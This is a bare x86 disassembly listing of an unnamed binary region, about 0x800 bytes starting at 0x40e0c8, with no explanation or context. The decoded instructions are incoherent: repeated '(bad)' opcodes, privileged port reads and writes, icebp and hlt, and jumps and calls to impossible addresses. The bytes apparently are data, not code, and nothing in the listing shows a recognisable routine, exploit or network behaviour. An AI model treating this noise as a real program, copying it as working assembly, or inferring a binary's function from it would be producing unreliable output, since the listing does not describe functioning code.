  40e0c8:	out    dx,eax
  40e0c9:	mov    eax,0xebfa00de
  40e0ce:	loopne 0x40e0ad
  40e0d0:	std    
  40e0d1:	sar    ah,0xe9
  40e0d4:	ret    0xe9e8
  40e0d7:	mov    cl,0xca
  40e0d9:	fsubrp st(5),st
  40e0db:	mov    bl,0xc9
  40e0dd:	out    0xe1,eax
  40e0df:	div    DWORD PTR [edi-0x2f34263a]
  40e0e5:	clc    
  40e0e6:	imul   ebp
  40e0e8:	aad    0xdb
  40e0ea:	out    0xfa,al
  40e0ec:	inc    dh
  40e0ee:	add    bl,bh
  40e0f0:	rol    bh,1
  40e0f2:	push   es
  40e0f3:	int    0xdf
  40e0f5:	(bad)  
  40e0f7:	shl    ch,0xd1
  40e0fa:	jmp    0xf206acdf
  40e0ff:	aad    0xb4
  40e101:	in     al,dx
  40e102:	std    
  40e103:	hlt    
  40e104:	fsub   st(1),st
  40e106:	sar    bh,cl
  40e108:	enter  0xd4d8,0xc1
  40e10c:	loopne 0x40e103
  40e10e:	sti    
  40e10f:	jecxz  0x40e0fc
  40e111:	retf   0xe7f5
  40e114:	in     eax,dx
  40e115:	add    al,al
  40e117:	loop   0x40e10c
  40e119:	fisub  WORD PTR [ebx+ebp*8-0x30304a30]
  40e120:	ror    bh,0xeb
  40e123:	xlat   BYTE PTR ds:[ebx]
  40e124:	fsub   st(6),st
  40e126:	out    dx,al
  40e127:	std    
  40e128:	fcmovne st,st(7)
  40e12a:	std    
  40e12b:	(bad)  
  40e12d:	(bad)  
  40e12f:	ret    0xf5ca
  40e132:	aad    0x5
  40e134:	or     ecx,ebx
  40e136:	add    ch,BYTE PTR [esi-0x3d1d401e]
  40e13c:	out    0xdb,eax
  40e13e:	loop   0x40e0f6
  40e140:	call   0xfd0595f5
  40e145:	mov    ch,0xf2
  40e147:	loop   0x40e13b
  40e149:	fdivr  st,st(6)
  40e14b:	add    al,dh
  40e14d:	fdivp  st(7),st
  40e14f:	(bad)  
  40e150:	idiv   ebp
  40e152:	fcomp  st(3)
  40e154:	(bad)
  40e157:	int    0xc9
  40e159:	out    0xc4,al
  40e15b:	(bad)
  40e15e:	lods   al,BYTE PTR ds:[esi]
  40e15f:	(bad)  [esi-0x2d361919]
  40e165:	int    0xd5
  40e167:	fninit 
  40e169:	(bad)  
  40e16a:	call   eax
  40e16c:	out    0xfd,al
  40e16e:	or     dh,dh
  40e170:	(bad)  
  40e171:	dec    edx
  40e173:	or     DWORD PTR [ecx],ecx
  40e175:	int3   
  40e176:	out    0xcf,al
  40e178:	fdiv   QWORD PTR [edx-0x3451281c]
  40e17e:	(bad)  
  40e17f:	cli    
  40e180:	mov    ch,0xeb
  40e182:	cli    
  40e183:	iret   
  40e184:	fcomp  st(4)
  40e186:	(bad)  
  40e187:	icebp  
  40e188:	shl    edx,cl
  40e18a:	cli    
  40e18b:	hlt    
  40e18c:	(bad)  
  40e18e:	retf   0xc207
  40e191:	cli    
  40e192:	add    eax,edi
  40e194:	jmp    0xc1e1:0xe4edf2db
  40e19b:	xlat   BYTE PTR ds:[ebx]
  40e19c:	enter  0xe5fb,0xda
  40e1a0:	out    dx,al
  40e1a1:	mov    edi,0xdedad0b4
  40e1a6:	xlat   BYTE PTR ds:[ebx]
  40e1a7:	icebp  
  40e1a8:	jecxz  0x40e18b
  40e1aa:	stc    
  40e1ab:	stc    
  40e1ac:	mov    esp,0xdcebe4cb
  40e1b1:	(bad)  
  40e1b2:	out    dx,al
  40e1b3:	in     al,0xec
  40e1b5:	or     ch,dl
  40e1b7:	out    dx,al
  40e1b8:	lock mov bh,0xea
  40e1bc:	out    0xe4,al
  40e1be:	repnz mov bl,0xb2
  40e1c1:	in     al,0xde
  40e1c3:	retf   0xb5de
  40e1c6:	mov    esp,0xf2f0e2f3
  40e1cb:	add    edx,ebx
  40e1cd:	push   es
  40e1ce:	pop    es
  40e1cf:	rol    BYTE PTR [edx],0xfe
  40e1d2:	in     eax,dx
  40e1d3:	push   cs
  40e1d4:	int3   
  40e1d5:	add    esi,edx
  40e1d7:	stos   DWORD PTR es:[edi],eax
  40e1d8:	ret    0xa4a9
  40e1db:	loopne 0x40e18d
  40e1dd:	cli    
  40e1de:	int    0xc1
  40e1e0:	(bad)  
  40e1e1:	icebp  
  40e1e2:	call   0xd715d4c5
  40e1e7:	repnz sar dh,1
  40e1ea:	shl    eax,0xd4
  40e1ed:	stc    
  40e1ee:	add    eax,0xc4eafae8
  40e1f3:	fiadd  WORD PTR [esi]
  40e1f5:	add    edx,ebp
  40e1f7:	mov    ecx,0xeaace0bf
  40e1fc:	out    dx,eax
  40e1fd:	aam    0xb6
  40e1ff:	call   0xfafaa9e3
  40e204:	fdivr  QWORD PTR [esi-0xa22483e]
  40e20a:	int    0xd0
  40e20c:	add    edi,edi
  40e20e:	push   es
  40e20f:	jmp    0xf00fd9df
  40e214:	out    dx,al
  40e215:	loop   0x40e226
  40e217:	faddp  st(4),st
  40e219:	shl    esi,1
  40e21b:	repz in al,0xc0
  40e21e:	aam    0xb6
  40e220:	fcmovu st,st(6)
  40e222:	repnz mov eax,0xb8e3d5f5
  40e228:	enter  0xced0,0xd7
  40e22c:	ret    
  40e22d:	pop    es
  40e22e:	icebp  
  40e22f:	test   BYTE PTR [ecx],0xe9
  40e232:	jecxz  0x40e211
  40e234:	mov    ah,0xcb
  40e237:	mov    bl,0xac
  40e239:	int    0xd3
  40e23b:	loopne 0x40e232
  40e23d:	lods   eax,DWORD PTR ds:[esi]
  40e23e:	stc    
  40e23f:	ror    ebp,cl
  40e241:	(bad)
  40e245:	jmp    0x40e241
  40e247:	fcomp  st(7)
  40e249:	out    0xde,eax
  40e24b:	mov    ebx,0x5f2f9f2
  40e250:	sti    
  40e251:	add    eax,0xce0c7ff
  40e256:	adc    ebp,DWORD PTR [eax-0x10181a32]
  40e25c:	mov    cl,0xce
  40e25e:	(bad)  
  40e25f:	mov    ecx,0xcec5f0ba
  40e264:	cmc    
  40e265:	jecxz  0x40e266
  40e267:	test   BYTE PTR [edi],0xd6
  40e26a:	shl    ah,0xc1
  40e26d:	fsubp  st(1),st
  40e26f:	(bad)  
  40e271:	(bad)  
  40e272:	mov    esp,0xe90be1e5
  40e277:	rcr    al,0xdd
  40e27a:	shl    dh,cl
  40e27c:	icebp  
  40e27d:	mov    bl,0xd6
  40e27f:	(bad)  
  40e280:	shr    ecx,cl
  40e282:	repz (bad) 
  40e284:	hlt    
  40e285:	ret    
  40e286:	mov    ebp,0xd907bad5
  40e28b:	test   esp,0xe7f6f0f3
  40e291:	add    edi,ebx
  40e293:	(bad)  
  40e294:	jmp    0xe71acd95
  40e299:	jmp    0xc7ebb088
  40e29e:	repnz (bad) 
  40e2a0:	out    dx,al
  40e2a1:	jmp    0xf1d8:0xc8d1fbfd
  40e2a8:	aad    0xef
  40e2aa:	into   
  40e2ab:	(bad)  
  40e2ac:	fadd   DWORD PTR [edx]
  40e2ae:	jmp    0x40e2b7
  40e2b0:	fmulp  st(1),st
  40e2b2:	call   0x1342edc2
  40e2b7:	loop   0x40e2a7
  40e2b9:	mov    bh,0xf0
  40e2bb:	aam    0xd7
  40e2bd:	repz mov al,0xc1
  40e2c0:	rcl    al,0xcc
  40e2c3:	mov    esi,0xdefab4f4
  40e2c8:	ret    0xe5d4
  40e2cb:	lock hlt 
  40e2cd:	in     al,0xfb
  40e2cf:	fmulp  st(0),st
  40e2d1:	(bad)  
  40e2d2:	leave  
  40e2d3:	aad    0xc4
  40e2d5:	stc    
  40e2d6:	cli    
  40e2d7:	shl    esp,0xa9
  40e2da:	(bad)  
  40e2db:	mov    ebp,0xb6cff0c2
  40e2e0:	call   0xca13979d
  40e2e5:	jmp    0x40e2dc
  40e2e7:	sar    bl,1
  40e2e9:	cmc    
  40e2ea:	add    ebx,esi
  40e2ec:	in     al,dx
  40e2ed:	out    0xc0,eax
  40e2ef:	cmc    
  40e2f0:	fsubrp st(7),st
  40e2f2:	(bad)  
  40e2f3:	in     al,0xe5
  40e2f5:	out    0xe3,al
  40e2f7:	out    0xc5,eax
  40e2f9:	iret   
  40e2fa:	shl    dl,0xef
  40e2fd:	mov    cl,0xe8
  40e2ff:	jmp    0x40e2ed
  40e301:	in     eax,dx
  40e302:	in     eax,0xbf
  40e304:	mov    dh,0xe2
  40e306:	mov    ebp,0xf0b8ffe9
  40e30b:	repnz shl edx,1
  40e30e:	jmp    0xcfd4:0xdc0af0e3
  40e315:	jmp    0xca2faf13
  40e31a:	(bad)  
  40e31b:	in     al,dx
  40e31c:	(bad)  
  40e31d:	div    dh
  40e31f:	in     eax,0xda
  40e321:	mov    ah,0xc5
  40e323:	enter  0xeaed,0xf2
  40e327:	(bad)  
  40e328:	mov    edx,0xd6cdced0
  40e32d:	std    
  40e32e:	in     eax,0xd8
  40e330:	call   0xff26ee2f
  40e335:	add    ah,cl
  40e337:	in     al,0xdd
  40e339:	jmp    0xf1049424
  40e33e:	(bad)  
  40e33f:	sar    DWORD PTR [eax-0x10121b3a],cl
  40e345:	ret    
  40e346:	int    0xe1
  40e348:	loope  0x40e30d
  40e34a:	jmp    edx
  40e34c:	repz cld 
  40e34e:	(bad)  
  40e34f:	in     eax,0xc1
  40e351:	(bad)  
  40e352:	jmp    0x326d054
  40e357:	fadd   st(7),st
  40e359:	in     al,dx
  40e35a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e35b:	iret   
  40e35c:	jmp    0x40e353
  40e35e:	mov    edx,0xf5cacbba
  40e363:	jmp    0xd4d3:0xfbded4d9
  40e36a:	add    edi,edx
  40e36c:	aam    0xbd
  40e36e:	fcmovnbe st,st(4)
  40e370:	jmp    0xda40a05b
  40e375:	fild   WORD PTR [esi]
  40e377:	ret    
  40e378:	shl    dh,cl
  40e37a:	lods   eax,DWORD PTR ds:[esi]
  40e37b:	out    0xad,eax
  40e37d:	ret    0xe9f6
  40e380:	jmp    0x40e361
  40e382:	aad    0xca
  40e384:	mov    dh,0xb5
  40e386:	xlat   BYTE PTR ds:[ebx]
  40e387:	stc    
  40e388:	(bad)  
  40e389:	cld    
  40e38a:	ret    0x5e3
  40e38d:	add    BYTE PTR [ecx],cl
  40e38f:	(bad)  
  40e391:	loopne 0x40e387
  40e393:	clc    
  40e394:	into   
  40e395:	add    ch,bl
  40e397:	retf   
  40e398:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e399:	int3   
  40e39a:	out    dx,al
  40e39b:	iret   
  40e39c:	(bad)
  40e39f:	retf   
  40e3a0:	jmp    0xcfd2:0xd7cad4f6
  40e3a7:	mov    ebx,0xdbf303ef
  40e3ac:	hlt    
  40e3ad:	loope  0x40e370
  40e3af:	fisttp WORD PTR [edi]
  40e3b1:	ror    edx,0xc6
  40e3b4:	jmp    0xbce3:0xcbe4130b
  40e3bb:	in     eax,0xc8
  40e3bd:	(bad)  
  40e3be:	imul   ch
  40e3c0:	cmc    
  40e3c1:	sti    
  40e3c2:	aad    0xc8
  40e3c4:	jecxz  0x40e3b3
  40e3c6:	mov    al,0xfa
  40e3c8:	aad    0xe1
  40e3ca:	rcl    edi,cl
  40e3cc:	fnstsw ax
  40e3ce:	in     eax,0xbf
  40e3d0:	fdivr  st(7),st
  40e3d2:	dec    DWORD PTR [esi+ebp*8]
  40e3d5:	or     al,0xe6
  40e3d7:	mov    esp,0xf2d3a9dd
  40e3dc:	xlat   BYTE PTR ds:[ebx]
  40e3dd:	jmp    0xc5f2d0b7
  40e3e2:	rcr    ecx,1
  40e3e4:	std    
  40e3e5:	mov    edx,0xcfeeddf3
  40e3ea:	mov    eax,0xd6e1d1f5
  40e3ef:	loop   0x40e3da
  40e3f1:	push   cs
  40e3f2:	retf   0x1c9
  40e3f5:	add    ah,ah
  40e3f7:	(bad)
  40e3fb:	icebp  
  40e3fc:	(bad)  
  40e3fd:	out    0xb2,eax
  40e3ff:	aad    0xd9
  40e401:	in     al,dx
  40e402:	fdivrp st(5),st
  40e404:	les    edi,FWORD PTR [esi-0x2630332d]
  40e40a:	mov    BYTE PTR [edi+ebx*8],0xfd
  40e40e:	jmp    0xf8e5:0xff0302d4
  40e415:	fst    QWORD PTR [ebx]
  40e417:	jmp    0x40e3fe
  40e419:	call   0xc70eacfb
  40e41e:	retf   
  40e41f:	in     eax,0xd7
  40e421:	out    0xb8,al
  40e423:	fcmovnbe st,st(1)
  40e425:	retf   
  40e426:	(bad)  
  40e428:	icebp  
  40e429:	out    dx,eax
  40e42a:	in     eax,dx
  40e42b:	lock std 
  40e42d:	fxch   st(2)
  40e42f:	loop   0x40e426
  40e431:	add    esi,esp
  40e433:	les    eax,FWORD PTR [esi]
  40e435:	push   es
  40e436:	add    al,cl
  40e438:	(bad)
  40e43b:	mov    esp,0xf6cfe2ef
  40e440:	(bad)
  40e443:	retf   0xc9ca
  40e446:	aam    0xe1
  40e448:	ret    0xe7ec
  40e44b:	loope  0x40e40d
  40e44d:	xlat   BYTE PTR ds:[ebx]
  40e44e:	sar    dl,0xc1
  40e451:	dec    ebx
  40e453:	add    ah,cl
  40e455:	int3   
  40e456:	repz in eax,dx
  40e458:	lods   eax,DWORD PTR ds:[esi]
  40e459:	(bad)
  40e45c:	jecxz  0x40e44c
  40e45e:	cmc    
  40e45f:	fdiv   st,st(1)
  40e461:	stc    
  40e462:	aam    0xd5
  40e464:	mov    edx,0xe1f6fadd
  40e469:	(bad)  
  40e46a:	loope  0x40e444
  40e46c:	ret    0xe0bc
  40e46f:	push   es
  40e470:	clc    
  40e471:	add    ch,bh
  40e473:	fild   DWORD PTR [edx]
  40e475:	pop    es
  40e476:	jecxz  0x40e441
  40e478:	retf   0xd5ef
  40e47b:	hlt    
  40e47c:	enter  0xf6c4,0xd1
  40e480:	fnstenv [esi-0xe06320e]
  40e486:	xlat   BYTE PTR ds:[ebx]
  40e487:	loop   0x40e463
  40e489:	fild   WORD PTR [edx]
  40e48b:	fdiv   st(6),st
  40e48d:	add    edi,ebp
  40e48f:	cli    
  40e490:	add    cl,bl
  40e492:	fsqrt  
  40e494:	int3   
  40e495:	fsubr  st(3),st
  40e497:	mov    dl,0xcc
  40e499:	loope  0x40e452
  40e49b:	jecxz  0x40e447
  40e49d:	shl    ebp,1
  40e49f:	(bad)  
  40e4a0:	sar    BYTE PTR [edi-0x13344c0d],cl
  40e4a6:	mov    ah,0xf5
  40e4a8:	call   esp
  40e4aa:	sar    ah,1
  40e4ac:	add    al,0xf2
  40e4ae:	mov    eax,0xd4f806e8
  40e4b3:	std    
  40e4b4:	aam    0xa
  40e4b6:	or     al,0xa7
  40e4b8:	stos   BYTE PTR es:[edi],al
  40e4b9:	mov    bh,0xd2
  40e4bb:	lods   eax,DWORD PTR ds:[esi]
  40e4bc:	out    dx,al
  40e4bd:	mov    ah,0xb4
  40e4bf:	loopne 0x40e47b
  40e4c1:	xbegin 0xf13ab791
  40e4c7:	hlt    
  40e4c8:	mov    eax,0xc1c103bf
  40e4cd:	loopne 0x40e494
  40e4cf:	pop    es
  40e4d0:	or     esi,edi
  40e4d2:	or     esp,edx
  40e4d4:	int    0xb
  40e4d6:	fucomp st(5)
  40e4d8:	jmp    0x40e4ad
  40e4da:	jmp    0xb4f8:0xbbe6d0bc
  40e4e1:	(bad)  
  40e4e2:	(bad)  
  40e4e3:	in     al,dx
  40e4e4:	mov    dh,0xf0
  40e4e6:	test   cl,0xf3
  40e4e9:	sar    bl,1
  40e4eb:	(bad)  
  40e4ec:	mov    edx,0xf0bbcf1
  40e4f1:	xlat   BYTE PTR ds:[ebx]
  40e4f2:	jmp    0x40e4de
  40e4f4:	fyl2xp1 
  40e4f6:	push   ebx
  40e4f8:	fisubr WORD PTR [esi-0xd290a52]
  40e4fe:	iret   
  40e4ff:	fcmove st,st(5)
  40e501:	enter  0xb5dd,0xd2
  40e505:	stc    
  40e506:	mov    ecx,0xd401c0cd
  40e50b:	(bad)  
  40e50c:	fadd   QWORD PTR [edi]
  40e50e:	(bad)  
  40e50f:	fcmovb st,st(0)
  40e511:	or     eax,ebp
  40e513:	stc    
  40e514:	aam    0xd
  40e516:	or     bl,cl
  40e518:	(bad)  
  40e51a:	(bad)
  40e51d:	cmc    
  40e51e:	shr    cl,cl
  40e520:	jmp    0xf2fd:0xd8ffddce
  40e527:	jmp    0xed1e9e23
  40e52c:	vpsubd xmm0,xmm4,xmm3
  40e530:	or     ebx,ecx
  40e532:	or     ah,ch
  40e534:	les    eax,FWORD PTR [ebx]
  40e536:	stc    
  40e537:	lods   al,BYTE PTR ds:[esi]
  40e538:	lods   eax,DWORD PTR ds:[esi]
  40e539:	(bad)  
  40e53b:	ret    0xacb4
  40e53e:	leave  
  40e53f:	sar    BYTE PTR [ecx-0x21b2b0b],1
  40e545:	repnz clc 
  40e547:	shl    edi,1
  40e549:	loop   0x40e532
  40e54b:	ret    0xc505
  40e54e:	mov    eax,0xdacaca0a
  40e553:	stc    
  40e554:	jecxz  0x40e564
  40e556:	loope  0x40e53d
  40e558:	jmp    0x40e52a
  40e55a:	loope  0x40e541
  40e55c:	ret    
  40e55d:	out    dx,al
  40e55e:	mov    ebx,0xdff8d1d5
  40e563:	std    
  40e564:	fld    st(3)
  40e566:	iret   
  40e567:	clc    
  40e568:	aam    0x1
  40e56a:	in     eax,0xc5
  40e56c:	loopne 0x40e564
  40e56e:	cli    
  40e56f:	in     eax,0x7
  40e571:	or     DWORD PTR ds:0x30ddfeb,eax
  40e577:	ret    0xf0e5
  40e57a:	out    0xbc,eax
  40e57c:	mov    dh,0xc3
  40e57e:	mov    cl,0xf7
  40e580:	shl    cl,1
  40e582:	mov    dh,0xcb
  40e584:	mov    ecx,0xbde0edd5
  40e589:	in     eax,dx
  40e58a:	mov    eax,0xe4dde2c0
  40e58f:	(bad)  
  40e591:	(bad)  
  40e592:	test   BYTE PTR [edx],0xce
  40e595:	add    cl,dh
  40e597:	fucom  st(1)
  40e599:	(bad)  
  40e59a:	int3   
  40e59b:	iret   
  40e59c:	loopne 0x40e595
  40e59e:	rcl    ch,cl
  40e5a0:	mov    eax,0xbbcfe4b9
  40e5a5:	mov    ebx,0xeff8f5d8
  40e5aa:	mov    esp,0xd8e0fdda
  40e5af:	mov    edi,0x3c7fb06
  40e5b5:	shr    esi,cl
  40e5b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5b8:	repz (bad) 
  40e5ba:	jmp    0x40e59d
  40e5bc:	iret   
  40e5bd:	ret    0xb0f7
  40e5c0:	repnz leave 
  40e5c2:	(bad)  
  40e5c3:	mov    edi,0xcfd9dbb5
  40e5c8:	cmc    
  40e5c9:	add    bh,al
  40e5cb:	out    0xb,eax
  40e5cd:	shl    ebp,0x8
  40e5d0:	psubusb mm0,QWORD PTR [edx]
  40e5d3:	(bad)  
  40e5d4:	loop   0x40e5bf
  40e5d6:	(bad)  
  40e5d8:	mov    edi,0xbcb3afeb
  40e5dd:	mov    dh,0xcb
  40e5df:	(bad)  
  40e5e0:	sti    
  40e5e1:	icebp  
  40e5e2:	in     eax,dx
  40e5e3:	jmp    0xed01:0xcfc9cff8
  40e5ea:	add    eax,0xf4d3c7d9
  40e5ef:	or     edx,ecx
  40e5f1:	jmp    0xea34dfb2
  40e5f6:	into   
  40e5f7:	ret    0xebc2
  40e5fa:	loopne 0x40e5e5
  40e5fc:	jmp    0xb1299be1
  40e601:	(bad)  
  40e602:	retf   
  40e603:	icebp  
  40e604:	cld    
  40e605:	cli    
  40e606:	rcl    ebx,1
  40e608:	out    dx,eax
  40e609:	push   es
  40e60a:	loopne 0x40e5f8
  40e60c:	or     ebx,ecx
  40e60e:	rcl    esi,1
  40e610:	(bad)  
  40e611:	dec    BYTE PTR [ecx]
  40e613:	(bad)
  40e616:	or     esp,edx
  40e618:	icebp  
  40e619:	(bad)  
  40e61b:	scas   al,BYTE PTR es:[edi]
  40e61c:	ror    ecx,0xd3
  40e61f:	mov    bl,0xf6
  40e621:	(bad)  
  40e622:	into   
  40e623:	mov    ah,0xf2
  40e625:	cli    
  40e626:	xlat   BYTE PTR ds:[ebx]
  40e627:	aad    0xdf
  40e629:	lock xlat BYTE PTR ds:[ebx]
  40e62b:	mov    ebx,0xf5e6ebdb
  40e630:	out    0x7,al
  40e632:	retf   
  40e633:	cmc    
  40e634:	(bad)
  40e637:	(bad)  
  40e638:	fsubr  QWORD PTR [esp+eiz*4-0x1b0b3949]
  40e63f:	shl    edi,0xea
  40e642:	mov    al,0xb3
  40e644:	aam    0xc9
  40e646:	mov    ebx,0x3b9c1e9
  40e64b:	loopne 0x40e63d
  40e64d:	repnz stc 
  40e64f:	std    
  40e650:	out    0x9,eax
  40e652:	add    al,0xf8
  40e654:	stc    
  40e655:	int3   
  40e656:	jmp    0xe9e3:0xc4eabef3
  40e65d:	out    0xf7,al
  40e65f:	in     al,0xcc
  40e661:	fcom   st(7)
  40e663:	fcmove st,st(2)
  40e665:	clc    
  40e666:	loop   0x40e642
  40e668:	rcl    ah,1
  40e66a:	stc    
  40e66b:	idiv   edi
  40e66d:	stc    
  40e66e:	add    ebx,esp
  40e670:	enter  0xd6e5,0xcd
  40e674:	out    dx,al
  40e675:	ffreep st(4)
  40e677:	in     eax,dx
  40e678:	retf   
  40e679:	rol    dl,cl
  40e67b:	out    0xc8,al
  40e67d:	mov    ebx,0xeffab4c5
  40e682:	shl    BYTE PTR [esi+esi*8-0x20fd4021],1
  40e689:	cld    
  40e68a:	aad    0xf5
  40e68c:	ffree  st(5)
  40e68e:	rcr    ebx,1
  40e690:	psubusb mm7,mm5
  40e693:	or     al,0xe
  40e695:	push   cs
  40e696:	clc    
  40e697:	loop   0x40e67b
  40e699:	mov    dl,0xe3
  40e69b:	into   
  40e69c:	mov    bh,0xc6
  40e69e:	call   0xf137d06c
  40e6a3:	leave  
  40e6a4:	mov    ah,0xe9
  40e6a6:	rol    DWORD PTR [edx],cl
  40e6a8:	neg    ah
  40e6aa:	icebp  
  40e6ab:	add    al,BYTE PTR [ecx]
  40e6ad:	add    ebx,esp
  40e6af:	retf   0x3e7
  40e6b2:	leave  
  40e6b3:	dec    BYTE PTR [edi]
  40e6b5:	call   0xeef2cfc3
  40e6ba:	in     eax,dx
  40e6bb:	div    BYTE PTR [eax-0x8053625]
  40e6c1:	retf   
  40e6c2:	aam    0xe8
  40e6c4:	in     eax,dx
  40e6c5:	mov    eax,0xd1bce1ec
  40e6ca:	out    0x3,al
  40e6cc:	lock cmc 
  40e6ce:	add    dl,cl
  40e6d0:	clc    
  40e6d1:	add    ebx,edx
  40e6d3:	or     cl,ah
  40e6d5:	enter  0xe2d8,0xc2
  40e6d9:	loop   0x40e68b
  40e6db:	int    0xc0
  40e6dd:	mov    dh,0xd4
  40e6df:	mov    bh,0xb5
  40e6e1:	enter  0xedf7,0xf8
  40e6e5:	add    esp,edx
  40e6e7:	idiv   BYTE PTR [edi-0x3e19014b]
  40e6ed:	or     esi,edx
  40e6ef:	jmp    0xde0aa7e8
  40e6f4:	in     eax,0xe7
  40e6f6:	retf   
  40e6f7:	icebp  
  40e6f8:	enter  0xc0c0,0xc1
  40e6fc:	in     al,dx
  40e6fd:	repz fxtract 
  40e700:	aam    0xfe
  40e702:	iret   
  40e703:	mov    ecx,0xfed5cde9
  40e708:	mov    ecx,0xd0d7f706
  40e70d:	fcmovbe st,st(1)
  40e70f:	(bad)  
  40e710:	fld    QWORD PTR [eax]
  40e712:	out    0xcd,al
  40e714:	dec    edx
  40e716:	adc    esp,esi
  40e718:	out    dx,eax
  40e719:	fsubrp st(7),st
  40e71b:	shr    dl,cl
  40e71d:	out    dx,al
  40e71e:	in     eax,0xd2
  40e720:	jmp    0xecd4:0xd5cbf1f9
  40e727:	jecxz  0x40e6fc
  40e729:	mov    edi,0xffdcfee2
  40e72e:	icebp  
  40e72f:	xlat   BYTE PTR ds:[ebx]
  40e730:	idiv   esi
  40e732:	(bad)  
  40e733:	jmp    0x40e716
  40e735:	(bad)  
  40e737:	scas   al,BYTE PTR es:[edi]
  40e738:	icebp  
  40e739:	lods   al,BYTE PTR ds:[esi]
  40e73a:	loopne 0x40e713
  40e73c:	out    0xc3,eax
  40e73e:	mov    ah,0xea
  40e740:	mov    ch,0xd3
  40e742:	mov    ah,0xf7
  40e744:	call   0x333df13
  40e749:	fld    DWORD PTR [edi]
  40e74b:	shl    ebp,0xd7
  40e74e:	test   BYTE PTR [edi],0xc9
  40e751:	retf   0xd902
  40e754:	(bad)  
  40e756:	or     edi,DWORD PTR [edi-0x1b2c1c38]
  40e75c:	ret    
  40e75d:	out    dx,eax
  40e75e:	out    dx,eax
  40e75f:	retf   
  40e760:	int    0xe6
  40e762:	retf   0xf2d3
  40e765:	jmp    0xf3dc:0xc3ecd9d5
  40e76c:	add    al,0xfa
  40e76e:	(bad)
  40e771:	test   DWORD PTR [eax],0xec04e1fe
  40e777:	fmulp  st(1),st
  40e779:	jmp    0xee059855
  40e77e:	repnz mov ch,0xf3
  40e781:	cmc    
  40e782:	fcmovbe st,st(1)
  40e784:	mov    esi,0xcedd03f6
  40e789:	cli    
  40e78a:	neg    ecx
  40e78c:	loopne 0x40e789
  40e78e:	add    al,0xd1
  40e790:	or     esp,ebx
  40e792:	cld    
  40e793:	pop    es
  40e794:	retf   0x12db
  40e797:	(bad)  
  40e799:	(bad)  
  40e79a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e79b:	(bad)  
  40e79c:	rol    esi,1
  40e79e:	out    0xf8,eax
  40e7a0:	mov    dh,0xee
  40e7a2:	in     al,dx
  40e7a3:	dec    esi
  40e7a5:	fiadd  DWORD PTR [ebx]
  40e7a7:	fsub   st(4),st
  40e7a9:	(bad)  
  40e7aa:	div    edi
  40e7ac:	(bad)  
  40e7ad:	clc    
  40e7ae:	out    0xe5,al
  40e7b0:	(bad)  
  40e7b1:	loopne 0x40e773
  40e7b3:	(bad)  
  40e7b4:	jecxz  0x40e77f
  40e7b6:	or     eax,ebp
  40e7b8:	mov    bl,0xcf
  40e7ba:	jecxz  0x40e7ac
  40e7bc:	loope  0x40e7ac
  40e7be:	loope  0x40e7aa
  40e7c0:	jmp    0xbbfcddbc
  40e7c5:	neg    eax
  40e7c7:	ret    0xd0cd
  40e7ca:	loop   0x40e7cf
  40e7cc:	jecxz  0x40e7d5
  40e7ce:	ret    
  40e7cf:	ret    0xf8d8
  40e7d2:	hlt    
  40e7d3:	or     eax,esi
  40e7d5:	add    eax,0xc2f7d8ee
  40e7da:	repz ror edi,1
  40e7dd:	lods   al,BYTE PTR ds:[esi]
  40e7de:	fcmovu st,st(2)
  40e7e0:	int    0xb4
  40e7e2:	std    
  40e7e3:	in     eax,0xf8
  40e7e5:	mov    ah,0xc9
  40e7e7:	mov    edx,0xdebdb9f2
  40e7ec:	rol    BYTE PTR [ebx],1
  40e7ee:	fdivp  st(7),st
  40e7f0:	cmc    
  40e7f1:	clc    
  40e7f2:	add    al,0x1
  40e7f4:	jmp    0x40e7da
  40e7f6:	inc    edi
  40e7f8:	ret    0xb6b2
  40e7fb:	jmp    0xe706ddb2
  40e800:	(bad)  
  40e801:	aad    0xe9
  40e803:	mov    bl,0xb2
  40e805:	repnz mov edi,0xd4fdddc9
  40e80b:	repnz or ebx,esi
  40e80e:	mov    esp,0xd6e8c9c1
  40e813:	or     eax,ebp
  40e815:	in     eax,dx
  40e816:	out    0xae,al
  40e818:	jmp    0xaf02bf14
  40e81d:	neg    dl
  40e81f:	in     al,0xd2
  40e821:	mov    edi,0xefe8efda
  40e826:	call   0xe212b818
  40e82b:	int    0xec
  40e82d:	fcmovb st,st(6)
  40e82f:	fucom  st(4)
  40e831:	add    al,0xf4
  40e833:	or     ebp,ecx
  40e835:	stc    
  40e836:	into   
  40e837:	out    0xac,al
  40e839:	mov    cl,0xf0
  40e83b:	ret    0xace4
  40e83e:	loope  0x40e818
  40e840:	int3   
  40e841:	in     al,dx
  40e842:	mov    edi,0xf5f5cfff
  40e847:	add    al,cl
  40e849:	ret    
  40e84a:	mov    esp,0xb8e205dd
  40e84f:	loope  0x40e826
  40e851:	aad    0xf8
  40e853:	add    ah,ch
  40e855:	adc    esi,edx
  40e857:	mov    eax,0xe1f1e8ee
  40e85c:	call   0xb909c34a
  40e861:	out    dx,al
  40e862:	retf   0xb9f5
  40e865:	in     al,dx
  40e866:	div    ah
  40e868:	mov    edx,0xdcf5dcc3
  40e86d:	cli    
  40e86e:	aad    0xfc
  40e870:	fsubr  st,st(6)
  40e872:	into   
  40e873:	les    ecx,FWORD PTR [ebx]
  40e875:	retf   0xa8c8
  40e878:	shl    cl,0xc4
  40e87b:	cmc    
  40e87c:	shr    DWORD PTR [ebp-0x2a31263e],cl
  40e882:	lods   al,BYTE PTR ds:[esi]
  40e883:	(bad)  
  40e884:	lock rcl edi,1
  40e887:	loopne 0x40e87f
  40e889:	(bad)  
  40e88a:	shr    esp,cl
  40e88c:	fcmovbe st,st(3)
  40e88e:	shr    ebx,1
  40e890:	loope  0x40e871
  40e892:	fld    QWORD PTR [ecx]
  40e894:	jmp    0xd20fb69b
  40e899:	imul   DWORD PTR [esi-0x4f323316]
  40e89f:	sar    ebx,0xee
  40e8a2:	(bad)  
  40e8a3:	sti    
  40e8a4:	mov    edx,0xecf2b8f4
  40e8a9:	fldz   
  40e8ab:	add    ebx,edx
  40e8ad:	jmp    0xfc0a:0xad004e6
  40e8b4:	mov    cl,0xc
  40e8b7:	out    dx,al
  40e8b8:	int3   
  40e8b9:	enter  0xe6d1,0xb6
  40e8bd:	rcl    dl,1
  40e8bf:	in     eax,dx
  40e8c0:	retf   
  40e8c1:	(bad)
  40e8c4:	fdivr  st(0),st
  40e8c6:	call   0xed1edc86
  40e8cb:	sti    
  40e8cc:	cmc    
